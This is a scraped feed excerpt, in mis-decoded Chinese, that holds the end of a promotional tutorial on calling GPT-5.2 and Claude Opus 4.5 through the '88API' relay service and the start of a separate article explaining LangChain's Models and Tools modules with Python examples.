<p>åˆ›å»ºä¸€ä¸ªåä¸º <code>demo_gpt5.py</code> çš„æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># åˆå§‹åŒ–å®¢æˆ·ç«¯ï¼ŒæŒ‡å‘ 88API åœ°å€</span>
client = OpenAI(
    api_key=<span class="hljs-string">"ä½ çš„_88API_KEY"</span>,  <span class="hljs-comment"># å»ºè®®ä»ç¯å¢ƒå˜é‡è·å–</span>
    base_url=<span class="hljs-string">"https://api.88api.chat/v1"</span>
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat_with_gpt</span>():
    <span class="hljs-keyword">try</span>:
        response = client.chat.completions.create(
            model=<span class="hljs-string">"gpt-5.2-instant"</span>,  <span class="hljs-comment"># ä½¿ç”¨æœ€æ–°çš„æé€Ÿç‰ˆæ¨¡å‹</span>
            messages=[
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªèµ„æ·±çš„AIæŠ€æœ¯ä¸“å®¶ã€‚"</span>},
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"è¯·ç”¨ä¸€å¥è¯è§£é‡Š GPT-5.2 å’Œ GPT-4 çš„æœ€å¤§åŒºåˆ«ã€‚"</span>}
            ],
            temperature=<span class="hljs-number">0.7</span>,
        )
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"GPT-5.2 å›å¤ï¼š"</span>)
        <span class="hljs-built_in">print</span>(response.choices[<span class="hljs-number">0</span>].message.content)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è°ƒç”¨å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    chat_with_gpt()
</code></pre>
<h3 data-id="heading-9">å››ã€ è¿›é˜¶å®æˆ˜ï¼šæ‰“é€ ä¼ä¸šçº§ä»£ç åŠ©æ‰‹ (Claude Opus 4.5)</h3>
<p>åœ¨ 2026 å¹´çš„å¼€å‘åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬ä¸å†æ»¡è¶³äºç®€å•çš„é—®ç­”ï¼Œè€Œæ˜¯éœ€è¦ AI å¸®æˆ‘ä»¬è¦å¤„ç†å¤æ‚çš„ä»£ç é‡æ„ä»»åŠ¡ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å½“å‰ç¼–ç¨‹èƒ½åŠ›æœ€å¼ºçš„ <strong>Claude Opus 4.5</strong>ã€‚</p>
<h4 data-id="heading-10">åœºæ™¯ï¼šé‡æ„é—ç•™ä»£ç </h4>
<p>æˆ‘ä»¬éœ€è¦ AI å¸®æˆ‘ä»¬åˆ†æä¸€æ®µæ··ä¹±çš„ Python ä»£ç ï¼Œå¹¶é‡æ„ä¸ºç¬¦åˆ PEP8 æ ‡å‡†ã€å¸¦ç±»å‹æ³¨è§£çš„ç°ä»£ä»£ç ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">refactor_code_with_claude</span>(<span class="hljs-params">legacy_code</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨å‘¼å« Claude Opus 4.5 è¿›è¡Œä»£ç é‡æ„..."</span>)
    
    prompt = <span class="hljs-string">f"""
    ä½ æ˜¯ä¸€ä¸ªä¸–ç•Œçº§çš„ Python æ¶æ„å¸ˆã€‚è¯·é‡æ„ä»¥ä¸‹ä»£ç ï¼š
    1. æ·»åŠ  Type Hints
    2. ä¼˜åŒ–å˜é‡å‘½å
    3. æ·»åŠ è¯¦ç»†çš„ Docstrings
    4. ä¿æŒåŸæœ‰é€»è¾‘ä¸å˜
    
    é—ç•™ä»£ç ï¼š
    ```python
    <span class="hljs-subst">{legacy_code}</span>
</span></code></pre>
<pre><code class="hljs language-ini" lang="ini">"""

<span class="hljs-attr">response</span> = client.chat.completions.create(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"claude-opus-4.5"</span>,  <span class="hljs-comment"># è°ƒç”¨ 88API çš„ Claude 4.5 æ¥å£</span>
    <span class="hljs-attr">messages</span>=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}],
    <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">4096</span>  <span class="hljs-comment"># Opus 4.5 æ”¯æŒæ›´é•¿çš„è¾“å‡º</span>
)

return response.choices<span class="hljs-section">[0]</span>.message.content
</code></pre>
<h2 data-id="heading-11">æµ‹è¯•æ•°æ®</h2>
<p>bad_code = """
def c(x,y):
z = x+y
if z&gt;10:
return 1
else: return 0
"""</p>
<p>refactored = refactor_code_with_claude(bad_code)
print(refactored)</p>
<pre><code class="hljs language-ini" lang="ini">
**ä¸ºä»€ä¹ˆé€‰æ‹© Claude Opus 4.5ï¼Ÿ**\
åœ¨ **SWE-bench Verified** æµ‹è¯•ä¸­ï¼ŒOpus 4.5 è§£å†³äº† 80.9% çš„çœŸå® GitHub issueï¼Œè€Œ GPT-4o ä»…ä¸º 50% å·¦å³ã€‚å¯¹äºç”Ÿäº§çº§ä»£ç ç”Ÿæˆï¼ŒClaude ç›®å‰æ˜¯å”¯ä¸€çœŸç¥ã€‚

<span class="hljs-comment">## äº”ã€ é«˜çº§åº”ç”¨ï¼šåŸºäº GPT-5.2-Thinking çš„æ™ºèƒ½ä½“ (Agent)</span>

2026 å¹´æ˜¯ Agentï¼ˆæ™ºèƒ½ä½“ï¼‰çˆ†å‘çš„ä¸€å¹´ã€‚åˆ©ç”¨ **GPT-5.2 Thinking** å¼ºå¤§çš„æ¨ç†èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªèƒ½å¤Ÿè‡ªä¸»è§„åˆ’ä»»åŠ¡çš„ Agentã€‚

<span class="hljs-comment">### ç¤ºä¾‹ï¼šè‡ªåŠ¨åŒ–å¸‚åœºåˆ†æ Agent</span>

è¿™ä¸ª Agent å¯ä»¥è‡ªä¸»æ€è€ƒæ‰€éœ€çš„æ­¥éª¤ï¼Œä¾‹å¦‚ï¼š"å…ˆæœç´¢æ•°æ®ï¼Œå†è¿›è¡Œæ€»ç»“ï¼Œæœ€åç”ŸæˆæŠ¥å‘Š"ã€‚

```python
def market_analyst_agent(topic):
    <span class="hljs-comment"># å¯ç”¨ GPT-5.2 çš„ Thinking æ¨¡å¼</span>
    <span class="hljs-attr">response</span> = client.chat.completions.create(
        <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-5.2-thinking"</span>,
        <span class="hljs-attr">messages</span>=[
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªèƒ½å¤Ÿè¿›è¡Œå¤šæ­¥æ¨ç†çš„å¸‚åœºåˆ†æå¸ˆã€‚åœ¨å›ç­”å‰ï¼Œè¯·å…ˆç”¨&lt;thinking&gt;æ ‡ç­¾è¾“å‡ºä½ çš„æ€è€ƒè¿‡ç¨‹ã€‚"</span>},
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: f<span class="hljs-string">"åˆ†æä¸€ä¸‹ {topic} åœ¨2026å¹´çš„å¸‚åœºè¶‹åŠ¿ã€‚"</span>}
        ]
    )
    
    <span class="hljs-attr">content</span> = response.choices[<span class="hljs-number">0</span>].message.content
    <span class="hljs-comment"># 2026å¹´çš„æ¨¡å‹é€šå¸¸ä¼šè¿”å›ç»“æ„åŒ–çš„æ€è€ƒè¿‡ç¨‹</span>
    print(f"Agent åˆ†ææŠ¥å‘Š:
{content}")

<span class="hljs-comment"># å®æˆ˜è°ƒç”¨</span>
market_analyst_agent("AIå¤§æ¨¡å‹APIä¸­è½¬æœåŠ¡")
&lt;/thinking&gt;
</code></pre>
<p><strong>GPT-5.2-Thinking çš„ä¼˜åŠ¿</strong>ï¼š<br/>
ç›¸æ¯”æ™®é€šçš„ Prompt å·¥ç¨‹ï¼ŒThinking æ¨¡å‹å†…ç½®äº†ç±»ä¼¼"æ€ç»´é“¾"ï¼ˆChain of Thoughtï¼‰çš„è®­ç»ƒï¼Œèƒ½å¤Ÿå¤„ç†å¤šè¾¾æ•°åæ­¥çš„å¤æ‚é€»è¾‘æ¨ç†ï¼Œé”™è¯¯ç‡å¤§å¹…é™ä½ã€‚</p>
<h3 data-id="heading-12">å…­ã€ æˆæœ¬ä¼˜åŒ–ä¸æ€§èƒ½ç›‘æ§</h3>
<p>æ¥å…¥ 88API åï¼Œå¦‚ä½•çœé’±ä¹Ÿæ˜¯ä¸€é—¨å­¦é—®ã€‚</p>
<ol>
<li>
<p><strong>æ¨¡å‹è·¯ç”±ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>
<p><strong>ç®€å•ä»»åŠ¡</strong>ï¼ˆå¦‚åˆ†ç±»ã€ç¿»è¯‘ï¼‰ï¼šä½¿ç”¨ <code>gpt-5.2-instant</code> æˆ– <code>claude-3-haiku</code> (æä¾¿å®œ)ã€‚</p>
</li>
<li>
<p><strong>ç¼–ç¨‹ä»»åŠ¡</strong>ï¼šåªåœ¨å…³é”®ä»£ç ç”Ÿæˆæ—¶ä½¿ç”¨ <code>claude-opus-4.5</code> ($5/1M)ã€‚</p>
</li>
<li>
<p><strong>å¤æ‚æ¨ç†</strong>ï¼šä½¿ç”¨ <code>gpt-5.2-thinking</code> æˆ– <code>gpt-5.2-pro</code>ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>åˆ©ç”¨ 88API çš„ç¼“å­˜æœºåˆ¶</strong>ï¼š</p>
<ul>
<li>å¯¹äºé‡å¤çš„å¤§æ®µ Promptï¼ˆå¦‚ç³»ç»Ÿè®¾å®šã€çŸ¥è¯†åº“ä¸Šä¸‹æ–‡ï¼‰ï¼Œæ–°ç‰ˆ API æ”¯æŒ Context Cachingï¼Œæœ€é«˜å¯èŠ‚çœ 90% çš„è¾“å…¥ Token è´¹ç”¨ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">ä¸ƒã€ æ€»ç»“</h3>
<p>2026å¹´ï¼ŒAI åº”ç”¨å¼€å‘çš„é—¨æ§›è¿›ä¸€æ­¥é™ä½ï¼Œä½†å¤©èŠ±æ¿å´è¢«æ— é™æ‹”é«˜ã€‚</p>
<ul>
<li>
<p><strong>GPT-5.2</strong> è®©æˆ‘ä»¬æ‹¥æœ‰äº†è¿‘ä¹äººç±»ä¸“å®¶çš„é€šç”¨æ™ºåŠ›ã€‚</p>
</li>
<li>
<p><strong>Claude Opus 4.5</strong> è®©ä¸€äººå¼€å‘å…¨æ ˆåº”ç”¨æˆä¸ºç°å®ã€‚</p>
</li>
<li>
<p><strong>88API</strong> ä¸ºæˆ‘ä»¬æŠ¹å¹³äº†æŠ€æœ¯æ¥å…¥çš„é¸¿æ²Ÿã€‚</p>
</li>
</ul>
<p>ç°åœ¨å°±æ˜¯æœ€å¥½çš„æ—¶åˆ»ï¼Œå»æ„å»ºå±äºä½ çš„ AI åº”ç”¨å§ï¼</p>
<blockquote>
<p><strong>ç›¸å…³èµ„æº</strong>ï¼š</p>
<ul>
<li>
<p>88API å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.88api.chat" target="_blank" title="https://api.88api.chat" ref="nofollow noopener noreferrer">api.88api.chat</a></p>
</li>
<li>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2F88api.apifox.cn" target="_blank" title="https://88api.apifox.cn" ref="nofollow noopener noreferrer">88api.apifox.cn</a></p>
</li>
<li>
<p>OpenAI GPT-5.2 å‘å¸ƒè¯´æ˜ (2025.12)</p>
</li>
<li>
<p>Anthropic Claude Opus 4.5 è¯„æµ‹æŠ¥å‘Š (2025.11)</p>
</li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡åŠ©ä½ äº†è§£Langchain]]></title>    <link>https://juejin.cn/post/7594358540048810019</link>    <guid>https://juejin.cn/post/7594358540048810019</guid>    <pubDate>2026-01-13T03:45:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594358540048810019" data-draft-id="7592094314471899171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡åŠ©ä½ äº†è§£Langchain"/> <meta itemprop="keywords" content="Python,Agent,LangChain"/> <meta itemprop="datePublished" content="2026-01-13T03:45:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯»æ‰¾å…‰_sxy"/> <meta itemprop="url" content="https://juejin.cn/user/1495754537711661"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡åŠ©ä½ äº†è§£Langchain
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1495754537711661/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯»æ‰¾å…‰_sxy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:45:22.000Z" title="Tue Jan 13 2026 03:45:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡ä¸­<a href="https://juejin.cn/post/7591703562134011938" target="_blank" title="https://juejin.cn/post/7591703562134011938">ï¼ˆæºç Demoï¼‰å¤§å®¶éƒ½åœ¨è¯´Agentï¼Œé‚£ä¹ˆAgentåˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</a>ï¼Œæˆ‘ä»¬äº†è§£<code>Agent</code>çš„æ¦‚å¿µï¼Œå¹¶ä»¥<strong>ä»£ç </strong>çš„å½¢å¼ä»‹ç»ï¼Œè¿™ä¸€ç¯‡å°†äº†è§£<code>AI</code>ä¸­çš„å¦å¤–ä¸€ä¸ªåè¯<code>LangChain</code>ã€‚</p>
<h2 data-id="heading-1">LangChainæ˜¯ä»€ä¹ˆ</h2>
<p>é¦–å…ˆäº†è§£<code>LangChain</code>æ˜¯ä»€ä¹ˆ.....</p>
<p><code>LangChain</code>æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºå¤§æ¨¡å‹åº”ç”¨çš„å¼€æºæ¡†æ¶ã€‚</p>
<p>å®ƒåƒä¹é«˜ç§¯æœ¨ä¸€æ ·ï¼Œç”±<strong>7</strong>ä¸ªå…³é”®æ¨¡å—ç»„æˆï¼Œå„ä¸ªæ¨¡å—è´Ÿè´£ç›¸å…³çš„éƒ¨åˆ†ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d10a8e98c7645ad82af12b526e9bbf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a-75om-5YWJX3N4eQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881778&amp;x-signature=%2FNksO5jk8Mpsu%2FTeKtd95t4yvcs%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p><strong>ç”©ä¸€å¼ å®˜æ–¹è¡¨æ ¼ï¼ˆä¸­è‹±å¯¹ç…§ï¼‰</strong>ï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/203106b70a864bb8bda69e7ee7aacf49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a-75om-5YWJX3N4eQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881778&amp;x-signature=7gvU4YGqOfyCvxdw22d6L2mNOSA%3D" alt="image.png" width="50%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0b83beba45f4822bfe3d5560b473090~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a-75om-5YWJX3N4eQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881778&amp;x-signature=twx%2Fmo6mPc5fzjroXdKwvcL9kpo%3D" alt="1.png" width="50%" loading="lazy"/>
<h3 data-id="heading-2">1ã€Models</h3>
<p>ç”¨äºå°è£…å’Œè°ƒç”¨å„ç§å¤§è¯­è¨€æ¨¡å‹<code>LLM</code>ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£å’Œæ ‡å‡†åŒ–çš„äº¤äº’æ–¹å¼ï¼š</p>
<ul>
<li><strong>ç»Ÿä¸€æ¥å£</strong>ï¼š è§£å†³ä¸åŒæ¨¡å‹æä¾›å•†<code>API</code>å·®å¼‚é—®é¢˜</li>
<li><strong>å‚æ•°ç®¡ç†</strong>ï¼šé›†ä¸­ç®¡ç†<code>API</code>å¯†é’¥ã€<code>temperature</code>ç­‰å‚æ•°</li>
<li><strong>é›†æˆæ–¹ä¾¿</strong>ï¼šå¤©ç„¶é€‚é…äº<code>LangChain</code>çš„ä¸€äº›åˆ«çš„ç»„ä»¶å’Œåº“</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå†…ç½®é‡è¯•ã€é”™è¯¯å¤„ç†æœºåˆ¶</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_llm</span>():
    api_key = os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> api_key:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è¯·åœ¨ .env æ–‡ä»¶ä¸­é…ç½® DASHSCOPE_API_KEY"</span>)
    
    llm = ChatOpenAI(
        model=<span class="hljs-string">"qwen-plus"</span>,  <span class="hljs-comment"># é€šä¹‰åƒé—®æ¨¡å‹</span>
        api_key=api_key,
        base_url=<span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>,
        temperature=<span class="hljs-number">0.7</span>,  <span class="hljs-comment"># æ§åˆ¶è¾“å‡ºçš„éšæœºæ€§</span>
    )
    <span class="hljs-keyword">return</span> llm
</code></pre>
<h3 data-id="heading-3">2ã€Tools</h3>
<p>ç”¨äºæ‰©å±•<code>AI</code>èƒ½åŠ›çš„å¤–éƒ¨åŠŸèƒ½ï¼Œä½¿<code>AI</code>èƒ½å¤Ÿä¸å¤–éƒ¨ç³»ç»Ÿäº¤äº’</p>
<ul>
<li><strong>åŠŸèƒ½æ‰©å±•</strong>ï¼šæ‰©å±•<code>AI</code>çš„å¤–éƒ¨èƒ½åŠ›ï¼Œå¦‚è°ƒç”¨åœ°å›¾<code>API</code>ã€æ—¶é—´<code>API</code>ç­‰</li>
<li><strong>ç³»ç»Ÿäº¤äº’</strong>ï¼šä¸å¤–éƒ¨çš„ç³»ç»Ÿäº¤äº’ï¼Œè®¿é—®æ•°æ®åº“ç­‰</li>
<li><strong>ä»»åŠ¡æ‰§è¡Œ</strong>ï¼šæ‰§è¡Œè®¡ç®—ä»»åŠ¡ç­‰</li>
</ul>
<p>é™¤äº†ä¸Šé¢<code>tool</code>æœ¬èº«è¦åšçš„äº‹ä¹‹å¤–ï¼Œ<code>langChain</code>è¿˜æä¾›è£…é¥°å™¨<code>@tool</code>å»å°†æ™®é€šå‡½æ•°è½¬æ¢ä¸º<code>Agent</code>å¯è°ƒç”¨çš„å·¥å…·ï¼Œè€Œä¸ç”¨å»æ‰‹å†™ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨ç”Ÿæˆå·¥å…·æè¿°</strong>ï¼šä»å‡½æ•°æ–‡æ¡£å­—ç¬¦ä¸²æå–ï¼Œä¾›<code>Agent</code>ç†è§£å·¥å…·ç”¨é€”</li>
<li><strong>è‡ªåŠ¨ç”Ÿæˆå·¥å…·<code>Schema</code></strong>ï¼šå°†å‡½æ•°ç­¾åè½¬æ¢ä¸º<code>JSON Schema</code>ï¼Œä¾›<code>Agent</code>å»è°ƒç”¨</li>
<li><strong>å·¥å…·æ³¨å†Œ</strong>ï¼šå°†å·¥å…·æ³¨å†Œåˆ°<code>Agent</code>çš„å·¥å…·åˆ—è¡¨ä¸­</li>
